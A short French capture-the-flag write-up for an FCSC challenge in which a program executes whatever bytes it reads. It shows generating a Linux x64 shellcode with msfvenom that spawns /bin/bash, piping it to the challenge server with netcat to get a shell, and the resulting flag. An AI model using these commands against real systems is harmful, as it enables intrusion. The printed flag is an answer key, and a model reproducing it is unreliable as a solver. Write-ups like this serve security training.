Le programme lit 512 octets (même \0 ou \n avec read) et les exécute directement. Il suffit donc de passer un shellcode valide (pour 64 bits)

On va en générer un avec msfvenom.

Lister les payloads disponibles :

`msfvenom --arch x64 --platform linux --list payloads`

`linux/x64/exec      Execute an arbitrary command or just a /bin/sh shell`

"exec" attire notre attention, on vérifie comment l'utiliser :

`msfvenom -p linux/x64/exec --list-options`

```
Basic options:
Name  Current Setting  Required  Description
----  ---------------  --------  -----------
CMD                    no        The command string to execute
```

On doit simplement passer la commande à exécuter avec l'option CMD, parfait.

On ajoute les options -f raw pour avoir les octets bruts et on écrit tout ça dans un fichier nommé payload

`msfvenom -p linux/x64/exec CMD=/bin/bash -f raw -o payload`

On doit utiliser le trick classique pour ne pas couper l'entrée standard après la lecture du fichier :

`cat payload - | ./execut0r` 

Ça marche, on a juste à exécuter la même commande en pipant dans netcat :

`cat payload - | nc france-cybersecurity-challenge.fr 2051`

FCSC{9f8a2eb6fbb26644dab670f1a948c449ba36102417efc3e40c3bd4774bfb4f7a}
